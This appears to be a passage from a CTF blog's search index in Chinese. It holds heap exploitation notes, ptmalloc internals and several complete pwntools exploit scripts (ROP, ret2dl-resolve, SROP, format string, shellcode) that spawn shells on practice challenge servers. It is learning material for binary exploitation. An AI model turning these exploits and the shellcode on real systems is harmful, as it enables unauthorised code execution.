3add(0x68,'name4','content') # 4add(0x68,'name6','\\x00'*0x3+p64(0x70)+'\\x00'*0x30+p64(libc.sym['__malloc_hook'])) # 6add(0x68,'name7','\\x00'*0x58+p64(libc.sym['__free_hook']-0xb58))# 7add(0x90,'name','content') # 8for i in range(18): add(0x90,'name','content')add(0x90,'name','a'*0x8+p64(libc.sym['system']))delete(5)io.interactive()" }, { "title": "堆利用总结", "url": "/posts/%E5%A0%86%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/", "categories": "CTF, PWN", "tags": "heap", "date": "2022-09-12 20:11:00 +0800", "snippet": "安全检测Double Free检测该机制不允许释放一个已经处于free状态的chunk。因此，当攻击者将second chunk的size设置为-4的时候，就意味着该size的PREV_INUSE位为0，也就是说second chunk之前的first chunk(我们需要free的chunk)已经处于free状态，那么这时候再free(first)的话，就会报出double free错误。相关代码如下：/* Or whether the block is actually not marked used. */if (__glibc_unlikely (!prev_inuse(nextchunk))){ errstr = \"double free or corruption (!prev)\"; goto errout;}Next Size非法检测该机制检测next size是否在8到当前arena的整个系统内存大小之间。因此当检测到next size为-4的时候，就会报出invalid next size错误。相关代码如下：nextsize = chunksize(nextchunk);if (__builtin_expect (nextchunk-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0)){ errstr = \"free(): invalid next size (normal)\"; goto errout;}Heap Overflow 《Vudo Malloc Tricks》(2001) 《Once Upon A free()》(2001) 《The Malloc Maleficarum》(2005) 《MALLOC DES-MALEFICARUM》(2009) hack.lu(2014)赛题oreo有一些很基本的利用方式如double free、heap overflow和used after free就不再赘述了。fastbin dupfast bin为单向链表，结构简单，容易伪造，为了提高效率，安全检查少。 利用思路 可以通过修改链表指针fd，在fast bin链表中引入伪造的空闲fast chunk 常见的修改方式有double free、heap overflow等 下次分配时分配出伪造的fast chunk 伪造的fast chunk可以在.bss全局变量处，也可以在栈上 double freedouble free伪造fastbin注意不能连续释放同样的chunk，需要在中间插入一个别的chunk/* Check that the top of the bin is not the record we are going to add\t (i.e., double free). */\tif (__builtin_expect (old == p, 0))\t {\t errstr = \"double free or corruption (fasttop)\";\t goto errout;\t }unsafe unlink当我们释放一个chunk块的时候，堆管理器会检查当前chunk的前后chunk是否为释放状态，若是则会把释放状态的前后块与当前块合并（大小在fastbin范围中的chunk块除外），这时就会出现把已经释放的chunk块从双向循环链表中取出的操作。FD-&gt;bk=BKBK-&gt;fd=FD如果我们能够伪造chunk块的FD和BK指针，我们就能进行一定的漏洞攻击。这里讨论当前在unlink过程中已经加入检查的情况：// 检查1:FD-&gt;bk==BK-&gt;fd==Pif (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);//检查2:物理相邻的下一个chunk块的pre_size==sizeif (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) malloc_printerr (\"corrupted size vs. prev_size\");// 为了绕过检查我们可以这样构造(64位)// 注意这里我们的指针P一直指的是进行unlink的chunk的地址FD = &amp;P - 0x18BK = &amp;P - 0x10// 这样在unlink操作时FD-&gt;bk=BK ==&gt; *(&amp;P-0x18+0x18)=&amp;P-0x10BK-&gt;fd=FD ==&gt; *(&amp;P-0x10+0x10)=&amp;P-0x18// 最终达到的效果便是P=&amp;P-0x18off by oneextend the chunk(allocated) 0x100 0x100 0x80|-------|-------|-------|| A | B | C | 初始状态|-------|-------|-------|| A | B | C | 溢出 B 的 size 为 0x180 (C-&gt;prev_size)|-------|-------|-------|| A | B | C | 释放 B|-------|-------|-------|| A | B | C | malloc(0x180-8)|-------|-------|-------| C 块被覆盖 |&lt;-- malloced--&gt;|假设存在⼀個 off-by-one 漏洞，我们目的是构造overlap chunk，则构造过程应该为： 申请三个堆块A、B、C，假定它们的size分别为sizeA、sizeB、sizeC，向A中写入数据覆盖到B中的size域，将B的size改为sizeB+sizeC。 把B块free掉，此时根据B块的size去找下⼀块chunk的header进行inused bit检查，这里C块是被使用的，所以可以通过检查，通过检查后，free掉的堆块会根据sizeB+sizeC的大小放到bins里面。 把C块也free掉，然后malloc(sizeB+sizeC)，将刚刚被放到bins里面的chunk分配出来,这个时候C这个chunk还是在bins上面的，通过刚刚分配的chunk就可以控制chunk C的fd指针，从而实现任意地址写。extend the chunk(free) 0x100 0x100 0x80|-------|-------|-------|| A | B | C | 初始状态|-------|-------|-------|| A | B | C | 释放 B|-------|-------|-------|| A | B | C | 溢出 B 的 size 为 0x180|-------|-------|-------|| A | B | C | malloc(0x180-8)|-------|-------|-------| C 块被覆盖 |&lt;-- malloced--&gt;|对于已经在unsorted bin中的块，通过覆盖size在分配的时候覆盖到下一个块posion null byte 0x100 0x210 0x80|-------|---------------|-------|| A | B | C | 初始状态|-------|---------------|-------|| A | B | C | 释放 B|-------|---------------|-------|| A | B | C | 溢出 B 的 size 为 0x200|-------|---------------|-------| 之后的 malloc 操作没有更新 C 的 prev_size 0x100 0x80|-------|------|-----|--|-------|| A | B1 | B2 | | C | malloc(0x100-8), malloc(0x80-8)|-------|------|-----|--|-------|| A | B1 | B2 | | C | 释放 B1|-------|------|-----|--|-------|| A | B1 | B2 | | C | 释放 C，C 将与 B1 合并|-------|------|-----|--|-------|| A | B1 | B2 | | C | malloc(0x180-8)|-------|------|-----|--|-------| 从B1开始，B2 将被覆盖 |&lt;-malloced-&gt;|house_of_einherjar 0x100 0x100 0x101|-------|-------|-------|| A | B | C | 初始状态|-------|-------|-------|| A | B | C | 释放 A|-------|-------|-------|| A | B | C | 溢出 B，覆盖 C 块的 size 为 0x200，并使其 prev_size 为 0x200|-------|-------|-------|| A | B | C | 释放 C|-------|-------|-------|| A | B | C | C 将与 A 合并|-------|-------|-------| B 块被重叠|&lt;----- malloced ------&gt;|null by one如果越界的字符只能是0字符，则可以构造如下的结构，通过prev_inuse向前合并完成overlap 0x100 0x40 0x100+-------+-------+-------+| A | B | C | 初始状态|-------|-------|-------|| U | B | C | 释放A，A进入unsorted bin|-------|-------|-------|| U | U | C | 释放B，B进入fastbin|-------|-------|-------|| U | B | C | 申请B，伪造prev_size为A+B大小，覆盖C的prev_inuse为0|-------|-------|-------|| U | B | U | 释放C，C会与AB块合并+-------+-------+-------++-------+-------+-------+| U | C与B重叠|-------|-------|-------|| U | B | | B仍在使用中+-------+-------+-------+hook attack__malloc_hook attack构造堆块到__malloc_hook区域可以实现任意地址执行__malloc_hook地址通过泄露libc基地址知道libc基地址可以通过unsorted_bin泄露main_arena得到__realloc_hook exploitone_gadget需要寄存器满足条件，通过调用realloc函数调整rsp使条件满足。realloc函数在执行时首先检查realloc_hook是否为0，如果不为0，则执行realloc_hook里的内容。我们可以将execve写到realloc_hook里面，我们可以根据具体的环境控制程序流从realloc函数中的某个push开始执行，这个时候函数的堆栈会发生变化，同时rsp也发生变化，这个时候我们就可以使rsp满足execve执行条件__free_hook attack通过伪造堆块到top chunk上方，需要注意伪造的size是否合法。如果top chunk上方没有可以构造的，也可以通过在bin上方构造后让bin指向top chunk间接劫持 关于通过Topchunk覆写Free_hook方法介绍House of botcakeunfinished…House of rabiitunfinished" }, { "title": "栈刷题小结", "url": "/posts/%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%931/", "categories": "CTF, Exercise", "tags": "stack", "date": "2022-09-12 20:11:00 +0800", "snippet": "实时数据监测(fmt)实时数据检测 32修改key_addr处内容位tar即可提权from pwn import *io = remote('220.249.52.133',42346)#context.log_level = 'debug'key_addr = 0x804a048tar = 0x2223322io.sendline(p32(key_addr) + '%' + str(tar-4) + 'x' + '%12$n')io.interactive()io.close()level5(gadget+mmap+shellcode)level5 64通过__libc_csu_init的gadget得到libc偏移地址和dl_runtime_resolve的地址，之后通过dl_runtime_resolve的gadget执行6个参数的mmap函数后向RWX区域写入shellcode并执行from pwn import *elf = ELF('level5')libc = ELF('libc.so.6')p = process('./level5')got_write = elf.got['write']got_read = elf.got['read']plt_read = elf.symbols['read']point_dl_runtime_resolve_addr = 0x600ff8got_pop_rax_ret = 0x0000000000023970main = 0x400564off_system_addr = libc.symbols['write'] - libc.symbols['system']off_mmap_addr = libc.symbols['write'] - libc.symbols['mmap']off_pop_rax_ret = libc.symbols['write'] - got_pop_rax_ret# __libc_csu_init# rdi= edi = r13, rsi = r14, rdx = r15# write(rdi=1, rsi=write.got, rdx=4)payload1 = \"\\x00\"*136payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_retpayload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]payload1 += \"\\x00\"*56payload1 += p64(main)p.recvuntil(\"Hello, World\\n\")print \"\\n#############sending payload1#############\\n\"p.send(payload1)sleep(1)write_addr = u64(p.recv(8))print \"write_addr: \" + hex(write_addr)mmap_addr = write_addr - off_mmap_addrprint \"mmap_addr: \" + hex(mmap_addr)pop_rax_ret = write_addr - off_pop_rax_retprint \"pop_rax_ret: \" + hex(pop_rax_ret)# __libc_csu_init# rdi= edi = r13, rsi = r14, rdx = r15# write(rdi=1, rsi=point_dl_runtime_resolve_addr, rdx=4)payload2 = \"\\x00\"*136payload2 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(point_dl_runtime_resolve_addr) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_retpayload2 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]payload2 += \"\\x00\"*56payload2 += p64(main)p.recvuntil(\"Hello, World\\n\")print \"\\n#############sending payload2#############\\n\"p.send(payload2)sleep(1)dl_runtime_resolve_addr = u64(p.recv(8))print \"dl_runtime_resolve_addr + 0x35: \" + hex(dl_runtime_resolve_addr + 0x35)shellcode = ( \"\\x48\\x31\\xc0\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\" + \"\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\" + \"\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05\" )# dl_runtime_resolve GADGET# 0x7ffff7def235 &lt;_dl_runtime_resolve+53&gt;: mov r11,rax# 0x7ffff7def238 &lt;_dl_runtime_resolve+56&gt;: mov r9,QWORD PTR [rsp+0x30]# 0x7ffff7def23d &lt;_dl_runtime_resolve+61&gt;: mov r8,QWORD PTR [rsp+0x28]# 0x7ffff7def242 &lt;_dl_runtime_resolve+66&gt;: mov rdi,QWORD PTR [rsp+0x20]# 0x7ffff7def247 &lt;_dl_runtime_resolve+71&gt;: mov rsi,QWORD PTR [rsp+0x18]# 0x7ffff7def24c &lt;_dl_runtime_resolve+76&gt;: mov rdx,QWORD PTR [rsp+0x10]# 0x7ffff7def251 &lt;_dl_runtime_resolve+81&gt;: mov rcx,QWORD PTR [rsp+0x8]# 0x7ffff7def256 &lt;_dl_runtime_resolve+86&gt;: mov rax,QWORD PTR [rsp]# 0x7ffff7def25a &lt;_dl_runtime_resolve+90&gt;: add rsp,0x48# 0x7ffff7def25e &lt;_dl_runtime_resolve+94&gt;: jmp r11shellcode_addr = 0xbeef0000# mmap(rdi=shellcode_addr, rsi=1024, rdx=7, rcx=34, r8=0, r9=0)payload3 = \"\\x00\"*136payload3 += p64(pop_rax_ret) + p64(mmap_addr)payload3 += p64(dl_runtime_resolve_addr+0x35) + p64(0) + p64(34) + p64(7) + p64(1024) + p64(shellcode_addr) + p64(0) + p64(0) + p64(0) + p64(0)# read(rdi=0, rsi=shellcode_addr, rdx=1024)payload3 += p64(pop_rax_ret) + p64(plt_read)payload3 += p64(dl_runtime_resolve_addr+0x35) + p64(0) + p64(0) + p64(1024) + p64(shellcode_addr) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0)payload3 += p64(shellcode_addr)p.recvuntil(\"Hello, World\\n\")print \"\\n#############sending payload3#############\\n\"p.send(payload3)sleep(1)# exploitp.send(shellcode+\"\\n\")sleep(1)p.interactive()welpwn(ROPgadget + LibcSearcher)welpwn 64 NX enabledfrom pwn import *from LibcSearcher import *io = remote(\"220.249.52.133\",44337)#io = process(\"./welpwn\")elf = ELF(\"./welpwn\")context.log_level = 'debug'context.arch = 'amd64'context.os = 'linux'pop4_addr = 0x40089cpop_rdi_addr = 0x4008a3pop_3arg_addr = 0x40089amov_3arg_addr = 0x400880main_addr = 0x4007cd'''ROPgadget泄露函数地址'''payload = 'a'*0x18 + p64(pop4_addr) + p64(pop_3arg_addr)payload += p64(0) + p64(1) + p64(elf.got['write']) + p64(8) + p64(elf.got['write']) + p64(1)payload += p64(mov_3arg_addr) + 'a'*56 + p64(main_addr)#gdb.attach(io)io.sendlineafter(\"RCTF\\n\",payload)sleep(1)write_addr = io.recvuntil('Welcome')[:-7].ljust(8,'\\x00')print write_addrprint u64(write_addr)'''搜索libc版本并计算基地址'''obj = LibcSearcher('write',u64(write_addr))base = u64(write_addr) - obj.dump('write')syscall = base + obj.dump('system')bin_str = base + obj.dump('str_bin_sh')payload2 = 'a'*0x18 + p64(pop4_addr) + p64(pop_rdi_addr) + p64(bin_str) + p64(syscall)io.sendlineafter(\"RCTF\\n\",payload2)io.interactive()babystack(one_gadget)babystack 64 Full RELRO Canary found NX enabled通过溢出泄露canary，后面正常溢出from pwn import *from LibcSearcher import *#io = process(\"./babystack\")io = remote('220.249.52.133',30144)elf = ELF('./babystack')libc = ELF('./libc-2.23.so')#context.log_level = 'debug'context.os = 'linux'context.arch = 'amd64'main_addr = 0x400908pop_rdi_addr = 0x400a93io.sendlineafter('&gt;&gt; ','2')'''get canary'''payload = 'a'*(0x90-0x8)io.sendlineafter('&gt;&gt; ','1')sleep(1)io.sendline(payload)io.sendlineafter('&gt;&gt; ','2')canary = io.recv(0x90)canary = canary[-7:]canary = '\\x00' + canary'''get base'''payload2 = 'a'*0x88 + canary + p64(0xdeadbeef)payload2 += p64(pop_rdi_addr) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main_addr)io.sendlineafter('&gt;&gt; ','1')sleep(1)io.sendline(payload2)io.sendlineafter('&gt;&gt; ','3')base = io.recv(8)base = base.ljust(8,'\\x00')base = u64(base)base = base - libc.symbols['puts']'''get shellsystem('/bin/sh') fail？one_gadget -&gt; get shell'''sym_addr = base + libc.symbols['system']sh_addr = base + next(libc.search('/bin/sh'))onegadget_addr = base + 0x45216payload3 = 'a'*0x88 + canary + p64(0xdeadbeef)#payload3 += p64(pop_rdi_addr) + p64(sh_addr) + p64(sym_addr) + p64(main_addr)payload3 += p64(onegadget_addr)io.sendlineafter('&gt;&gt; ','1')sleep(1)gdb.attach(io)io.sendline(payload3)io.sendlineafter('&gt;&gt; ','3')io.interactive()io.close()pwn-100(ROPgadget + DynELF)pwn-100 64 NX enabled存在直接溢出from pwn import *io = remote('220.249.52.133',50298)#io = process('./pwn-100')elf = ELF('./pwn-100')context.log_level = 'debug'context.os = 'linux'context.arch = 'amd64'sh_addr = 0x601040#elf.bss() bss段写入覆盖stdin导致失败？pop_rdi_addr = 0x400763main_addr = 0x4006b8max_size = 0xc8pop_arg_addr = 0x40075amov_arg_addr = 0x400740'''配合DynELF使用得leak函数'''def leak(addr):\tpayload = 'a'*0x40 + p64(0xdeadbeef)\tpayload += p64(pop_rdi_addr) + p64(addr) + p64(elf.plt['puts']) + p64(main_addr)\tpayload = payload.ljust(max_size,'\\x00')\tio.send(payload)\tio.recvline()\tup = ''\tcontent = ''\twhile True: \t\tc = io.recv(numb=1, timeout=0.1)\t\tif up == '\\n' and c == \"\":\t\t\tcontent = content[:-1]+'\\x00'\t\t\tbreak\t\telse:\t\t\tcontent += c\t\t\tup = c\tcontent = content[:4]\treturn content'''泄露libc'''libc = DynELF(leak,elf = elf)sys_addr = libc.lookup('system','libc')'''向指定地址读入'/bin/sh'注意call [r12+8*rbx] 所以应该写入elf.got而非elf.plt'''payload = 'a'*0x40 + p64(0xdeadbeef)payload += p64(pop_arg_addr) + p64(0) + p64(1) + p64(elf.got['read']) + p64(8) + p64(sh_addr) + p64(0)payload += p64(mov_arg_addr) + 'a'*56 + p64(main_addr)payload = payload.ljust(max_size,'\\x00')sleep(1)io.send(payload)sleep(1)io.sendafter('bye~\\n','/bin/sh\\x00')'''调用system'''payload2 = 'a'*0x40 + p64(0xdeadbeef)payload2 += p64(pop_rdi_addr) + p64(sh_addr) + p64(sys_addr)payload2 = payload2.ljust(max_size,'\\x00')sleep(1)io.send(payload2)io.interactive()io.close()ret2dl-resolve(stack pivot+return to dl_runtime_resolve)ret2dl-resolve依据exploit里的步骤劫持需要注意如果不能一次hack成功可以分多次调试劫持，比如先控制程序返回到plt[0]但给出真实的reloc_arg，再劫持reloc_arg指向伪造的Elf32_Rel，但Elf32_Rel的内容与write的相同。如此可以一步步实现劫持这次利用中需要注意栈迁移伪造的栈过短，导致在初步调试时一直崩溃# !/usr/bin/python2from pwn import *io = process('./bof')elf = ELF('./bof')context.log_level = 'debug''''stack pivot'''bss_addr = 0x804a040leave_ret = 0x8048458 # mov esp,ebp; pop ebp; ret;ebp_ret = 0x804861b # pop ebp; ret;pop3_ret = 0x8048619read_plt = elf.plt['read']size = 100pivot_addr = bss_addr + 0x800payload = 'a'*0x6c + p32(0xdeadbeef)payload += p32(read_plt)payload += p32(pop3_ret)payload += p32(0)payload += p32(pivot_addr)payload += p32(size)payload += p32(ebp_ret)payload += p32(pivot_addr) # stack pivot herepayload += p32(leave_ret)io.sendlineafter('!\\n',payload)'''dl_runtime_resolve hack'''plt_0 = 0x8048380rel_plt = 0x8048330dynsym_addr = 0x80481d8dynstr_addr = 0x8048278write_got = elf.got['write']cmd = '/bin/sh\\x00'cmd_offset = 80fake_name = 'system\\x00'name_offset = 90st_name = pivot_addr+name_offset-dynstr_addrfake_dynsym_index = pivot_addr+20align = 0x10 - ((fake_dynsym_index-dynsym_addr)&amp;0xf)fake_dynsym_index = (fake_dynsym_index+align-dynsym_addr)/0x10fake_dynsym = p32(st_name)+p32(0)+p32(0)+p32(0x12)fake_info = fake_dynsym_index&lt;&lt;8|0x7fake_rel_plt = p32(write_got) + p32(fake_info)fake_arg = pivot_addr+20+16+align-rel_pltpayload2 = 'a'*4payload2 += p32(plt_0)payload2 += p32(fake_arg)payload2 += 'a'*4payload2 += p32(pivot_addr+cmd_offset)payload2 += 'a'*alignpayload2 += fake_dynsympayload2 += fake_rel_pltpayload2 += 'a'*(cmd_offset-len(payload2))payload2 += cmdpayload2 += 'a'*(name_offset-len(payload2))payload2 += fake_namepayload2 += 'a'*(size-len(payload2))sleep(0.5)io.sendline(payload2)io.interactive()bof(ret2dl)模板题from pwn import *import base64context.log_level = 'debug'context.arch = 'i386'context.os = 'linux'elf = ELF('./bof')io = process(\"./bof\")rop = ROP(elf)dlresolve = Ret2dlresolvePayload(elf, symbol=\"system\", args=[\"/bin/sh\"], data_addr=elf.bss())rop.raw(b'a' * (0x6c+0x4))rop.read(0, dlresolve.data_addr)rop.ret2dlresolve(dlresolve)print(rop.dump())io.recvuntil(\"Welcome to XDCTF2015~!\\n\")io.sendline(rop.chain())sleep(0.5)print(len(dlresolve.payload))io.send(dlresolve.payload)io.interactive()ciscn_2019_s_3(srop)模板题，注意栈上泄露了栈地址，因此可以直接在栈上写”/bin/sh”from pwn import *context.log_level = 'debug'context.arch = 'amd64'context.os = 'linux'elf = ELF('./ciscn_s_3')io = remote(\"node4.buuoj.cn\", 29867)ropelf = ROP(elf)payload = b'/bin/sh\\x00'*2 + p64(elf.symbols['vuln'])io.sendline(payload)io.recv(0x20)binsh_addr = u64(io.recv(8)) - 280print(hex(binsh_addr))frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = binsh_addrframe.rsi = 0frame.rdx = 0# frame.rsp = 0xdeadbeefframe.rip = ropelf.syscall.addresssleep(0.5)ropelf.raw(b'/bin/sh\\x00' * 2)ropelf(rbp = ropelf.syscall.address)ropelf.call('gadgets')payload = ropelf.chain() + bytes(frame)print(ropelf.dump())io.sendline(payload)io.interactive()" }, { "title": "攻击方式杂项", "url": "/posts/%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%9D%82%E9%A1%B9/", "categories": "CTF, PWN", "tags": "fmt, intoverflow, dynelf", "date": "2022-09-12 10:10:00 +0800", "snippet": "格式化字符串 %s：通过栈中的指针寻址 %x/%p：打印栈中内容 %n(dword)：前面已打印的长度写入某个内存地址 %hn(word) %hhn(byte)fmt_heap格式化字符串存在堆中，无法覆盖栈空间实现任意地址写入，可以通过%n先修改saved ebp指向的上一个saved ebp的内容，再通过上一个saved ebp指向任意地址整型攻击 阿丽亚娜5号火箭爆炸(1996) IO2BO(Integer Overflow to Buffer Overflow) 数组下标越界 符号类型转换 CVE-2013-2094泄露libc版本 libc base DynElf LibcSearcherDynElf如果可以实现任意内存读，可以模拟_dl_runtime_resolve函数的行为来解析符号，这样的好处是无需知道libc。（pwntools库中的DynELF模块） 编写一个通用的任意内存泄露函数（通过返回main函数允许内存泄露多次触发） 将泄露函数传入DynELF解析system地址 通过ROP调用systemshellcode在软件漏洞利用中经常用到的一小段代码，通常用于为攻击者启动一个能控制受害机的shell，利用execve等系统调用来获得高权限的shell。jmp esp在栈上布置shellcode，通过jmp esp、jmp ebp、call esp等间接跳转shellcode encode输入函数存在避免null字节、要求可见字符的ASCII、Unicode等情况时，可加入编码函数完成对shellcode的封装，在运行时动态解码还原。reference Shellcodes database for study cases" }, { "title": "ptmalloc总结", "url": "/posts/ptmalloc%E6%80%BB%E7%BB%93/", "categories": "Linux, Basic", "tags": "ptmalloc, heap", "date": "2022-09-10 22:10:00 +0800", "snippet": "memory allocators dlmalloc：通用分配器，是旧linux的默认分配器 ptmalloc2-glibc：基于dlmalloc fork jemalloc-FreeBSD、Firefox、Android tcmalloc-Google Chrome libumem-Solaris Windows10-segment heapmain arena指的是堆内存区域本身，并非结构。通过sbrk创建，主分配区可以使用brk和mmap来扩张主分配区和非主分配区形成一个环形链表进行管理。通过malloc_state-&gt;next来链接。Main Arena内存申请方式 brk通过传递的addr来重新设置program break，成功则返回0，否则返回-1，由操作系统提供。 sbrk用来增加heap，增加的大小通过参数increment决定，以页大小为单位，返回增加大小前的heap的program break，如果increment为0则返回program break，由glibc提供。 mmap：第一种用法是映射此盘文件到内存中；第二种用法是匿名映射，不映射磁盘文件，而向映射区申请一块内存。 munmap：用于释放内存。int brk(void *addr);void *sbrk(intptr_t increment);void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);int munmap(void *addr, size_t length);Heap申请内存thread arena 不同线程维护不同的堆称为per thread arena 只能使用mmap来映射内存 数量一旦增加，则不会减少 起始地址总是HEAP_MAX_SIZE对齐的. 每个thread arena中最初包含一个heap，当其内存用完后，会继续分配新的heap并加入到thread arena中。 arena的数量受到CPU核数的限制 32位系统：arena数量上限=2*核数 64位系统：arena数量上限=8*核数 Thread Arenaheap_info每个堆的头部，main arena由于只有一个heap所以没有heap_info。//arena.ctypedef struct _heap_info{ mstate ar_ptr; /* Arena for this heap. */ struct _heap_info *prev; /* Previous heap. */ size_t size; /* Current size in bytes. */ size_t mprotect_size; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */ /* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */ char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK];} heap_info;malloc_state管理arena的核心结构，包含堆的状态信息、bins链表等，每个arena可以有多个heap，但只能有一个malloc_state。main_arena的malloc_state是一个全局变量，位于libc.so的data segment，其他线程arena对应的malloc_state存储在arena本身当中。main_arena的偏移存放在libc中的malloc_trim()函数中。//malloc.cstruct malloc_state{ /* Serialize access. */ __libc_lock_define (, mutex); // 线程锁 /* Flags (formerly in max_fast). */ int flags; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; // ptmalloc 用一个 bit 来标识某一个 bin 中是否包含空闲 chunk 。 /* Linked list */ struct malloc_state *next; // 分配区全局链表，主分配区放头部，新加入的分配区放main_arean.next 位置 /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state *next_free; // 空闲的分配区 /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;};malloc_chunk prev_size：前一个块free，记录前一个块大小；未被free，可以被前一个chunk的用户数据空间复用 size：每次对齐的时候，都需要加上prev_size和size两个字段的空间值2*SIZE_SZ，第三位AMP NON_MAIN_ARENA：A=0为主分区分配，A=1 为非主分区分配 IS_MAPPED：M=1表示使用mmap映射区域 PREV_INUSE：P=1表示pre_chunk空闲 fd和bk：在bins中时，占用用户数据空间链接其他free chunk fd_nextsize和bk_nextsize：用于管理large块的时候的空闲chunk双向链表的管理。 chunk按照2*SIZE_SZ进行对齐，32位系统是8字节，64位系统是16字节。 最小的空间：prev_size字段+size字段+fd字段+bk字段=4*SIZE_SZ//malloc.cstruct malloc_chunk { INTERNAL_SIZE_T prev_size; /* 前一个空闲chunk的大小*/ INTERNAL_SIZE_T size; /* 字节表示的chunk大小，包括chunk头 */ struct malloc_chunk* fd; /* 双向链表 -- 只有在被free后才存在 */ struct malloc_chunk* bk; /* fd：前一个空闲的块 bk：后一个空闲的块*/ struct malloc_chunk* fd_nextsize; /*块大小超过512字节后会有这两个指针*/ struct malloc_chunk* bk_nextsize;};//prev_size ：前一块被free的话则为空闲块的大小，前一块未被free的话则为0//size ： 因为chunk是四字节对齐所以size的低三位一定是0，被用来做flagchunkfree chunkFree Chunkallocated chunk chunk的P flag决定了prev_size字段是否有意义 allocated chunk可以使用下一个chunk的prev_size字段Allocated Chunktop chunk 不属于任何bin，在arena中处于最高地址 当没有其他空闲块时，top chunk就会被用于分配 分裂时 一块时请求大小的chunk 另一块余下chunk将成为新的top chunk main arena通过sbrk拓展top chunk，thread arena通过mmap系统调用拓展top chunklast_remainder chunk 当请求small chunk大小的内存时，无法通过small bin何unsorted bin提供时，binmaps遍历寻找下一个最大非空bin。将该bin分裂成两部分，一部分返回给用户，剩余部分添加到unsorted bin。除此之外，添加到unsorted bin的chunk成为新的last_remainder chunk 生成last_remainder chunk后malloc_state结构体中的last_remainder成员指针就会被初始化，并且指向这个chunkmmaped chunk 当分配的内存非常大（大于分配阀值，默认128K）的时候，需要被mmap映射，则会放到mmaped chunk上，当释放mmaped chunk上的内存的时候会直接交还给操作系统。binsbins是用来管理和组织空闲内存块的链表结构，根据chunk的大小和状态，有许多不同的bins结构fast bins 10个bin 8B apart LIFO 16-64B(32bit)、32-128B(64bit) single linked list No Coalescing:Two chunks which are free can be adjacent to each other, it doesnt get combined into single free chunk. free时不会清理PREV_INUSE 对应malloc_state数据结构fastbinsYfastbins index check 可以看出不做对齐检查，伪造的chunk的size可以不完全合法 例如0x7f可以成为0x70bin的合法size(64bit)#define fastbin_index(sz) \\ ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)......idx = fastbin_index (nb);......if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))Fastbinunsorted bin When small or large chunk gets freed instead of adding them in to their respective bins, its gets added into unsorted bin. unsorted_bin中free_chunk的fd和bk指向了main_arena+88 bins 0-1 double-linked circular list unsorted bin中的chunkNON_MAIN_ARENA总是为0。small bins less than 512B(32bit)、1024B(64bit) bins 2-125共62组 起始0x10B(32bit)、0x20B(64bit) FIFO 8B(32bit)、16B(64bit) apart double-linked circular listlarge bins greater than equal to 512B(32bit)、1024B(64bit) bins 126-253共64组 FIFO 同一个bin内大小不一定相同，大块放在队首，小块放在队尾 out of these 64 bins: 32 bins 64B 16 bins 512B 8 bins 4096B 4 bins 32768B 2 bins 262144B 1 bin contains a chunk of remaining size double-linked circular list 对于large chunk而言，在malloc_chunk中除了fd和bk指针，还包含了fd_nextsize和bk_nextsize指针，指向不同大小的chunkBin 第一个插入bin内的堆fd、bk与bin进行连接，fd_nextsize、bk_nextsize指向自身 不同大小的chunk，堆中fd_nextsize指向比它小的堆块的堆头，bk_nextsize指向比它大的堆块的堆头 同样大小的chunk，先释放的成为堆头，FIFO，通过fd、bk在相同大小chunk间连接，fd_nextsize、bk_nextsize为0tcache(per-thread cache) glibc2.26引入 每个tcache bin最多只能有7个(TCACHE_FILL_COUNT)chunk tcache bin中chunk的inuse位不会置零，也就是说不会进行合并 LIFO 每个线程都会维护一个tcache_prethread_struct，它是整个tcache机制的管理结构，链入其中的chunk大小相同 tcache_entry用于链接空闲的chunk，指针直接指向chunk的userdata部分，也就是说复用了指针的含义。 释放时在填满tcache之后才进入传统的释放过程，分配时也先从tcache中搜索。# define TCACHE_FILL_COUNT 7......# define TCACHE_MAX_BINS\t\t64....../* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache. */typedef struct tcache_entry{ struct tcache_entry *next;} tcache_entry;/* There is one of these for each thread, which contains the per-thread cache (hence \"tcache_perthread_struct\"). Keeping overall size low is mildly important. Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons. */typedef struct tcache_perthread_struct{ char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS];} tcache_perthread_struct;#define 